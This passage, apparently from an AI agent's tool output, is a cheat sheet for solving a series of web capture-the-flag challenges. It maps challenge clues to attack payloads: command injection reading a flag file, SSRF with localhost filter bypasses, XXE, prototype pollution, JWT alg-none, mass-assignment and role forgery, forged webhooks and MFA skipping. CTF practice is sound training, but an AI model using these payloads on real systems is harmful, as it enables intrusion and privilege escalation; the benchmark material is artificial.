inds whatever you hand it\", administrator_required -> mass assignment  -> POST JSON {display_name, role:\"admin\", is_admin, isAdmin,\n                                                                                admin, roles:[\"admin\"], access_level, permissions}; GET secondary\ninventory_route + protected_reference                  -> field/action authz -> feature?id=<protected>&fields=<f>&action=<a>, EVERY single f x a\n\"fetch anything you point it at\", absolute_url_required -> SSRF (D15)        -> feature?url=http://127.0.0.1:8080<secondary>; ladder :80 :5000 ..\n  + secondary internal_only\ninput_parameter + example_path, \"too close to a real   -> cmd injection(D16) -> feature?<param>=<example>%3Bcat%20/run/huntress/objective.txt\n  shell\", 400 path_required, JSON stdout                                        -> stdout line 2 (then %0a, &&, |, $() if ; is filtered)\nrecovery_guide_route, \"Forgot your password ...        -> reset token (D17)  -> GET guide; request_route?account_id=<self_service id> -> token;\n  somebody else's account\", self_service_only                                   redeem_route?token=<it>&account_id=<other id> -> evidence\nprotected_reference + note \"checked by each resolver\", -> GraphQL (D18)      -> POST JSON {\"query\":\"{__schema{..}}\"}; then {caseIndex{id title\n  \"Discover the schema\", GET 404 not_found                                      visibility} case(id:\"<prot>\"){id title note}} -> note\nevent_type + owner_scope (values), \"believes every      -> forged webhook(D19)-> POST JSON {event_type,type,event: <ev>, owner_scope,scope,owner: <scope>,\n  event\", 405 post_required, webhook_rejected                                   role,current_role:\"admin\", source,sender:\"provider\", verified,signed,trusted:true}\nstate_format_route, \"blob of misplaced trust ... sign  -> unsigned state(D20)-> GET guide; POST {<request_field>: b64url(JSON sample, role=\"administrator\")}\n  nothing\", 400 state_required, role_not_permitted                              to the guide's transport route (role ladder: administrator, admin, superuser..)\ncurrent_role / role cookie / X-*-Role                  -> role tampering     -> set the named value to administrator/admin (cookie, header, claim)\neyJ..eyJ..sig in cookie/Authorization, blob + .sig     -> JWT / signed state -> alg none / leaked secret / re-sign; then the role ladder\notp/verify/step 2, \"second factor\", \"remember me\"      -> MFA step skip      -> call the final step with the step-1 session; omit/reuse the code\nlocation.hash/search -> innerHTML/eval in inline JS    -> DOM XSS            -> payload in #fragment; bot or callback check\n?next=/?return=/redirect_uri                           -> open redirect      -> point it at the clue route / //other-host\nSSRF filtered (blocked_host) -> 2130706433, 127.1, [::1], allowed@127.0.0.1, file:///run/... \"localhost only\" -> X-Forwarded-For: 127.0.0.1\n/api/v1 vs /v2, \"legacy\", \"beta\"; ws:// in JS          -> shadow API / WS    -> the protected op on every version / transport (same authz?)\nXML/SVG/DOCX upload -> XXE <!ENTITY x SYSTEM \"file:///run/huntress/objective.txt\">. \"__proto__\"/JSON merge -> {\"__proto__\":{\"isAdmin\":true}}\nGeneric rejection naming no field (webhook_rejected) -> ONE alias-union JSON body first (D19). Real bot only on \"reviewer visits\" (D07).\nNEW CLASS = write lib/web/handlers/dayNN_*.py (KEY_MAP + HANDLERS) BEFORE the single submit (D11, D19, D20 -> TT first\ntry; D09-D10, D12-D13, D15-D18 TT went solver_incomplete). Banners are costume; the title pun names the bug.\n```","stderr":"","interrupted":false,"isImage":false,"noOutputExpected":false},"tool_result_meta":[{"id":"toolu_01Ag1kscPj9gZ3U3wU5CEgSE","permission_decision":{"decision":"accept","source":"config","reason_type":"mode"}}]}
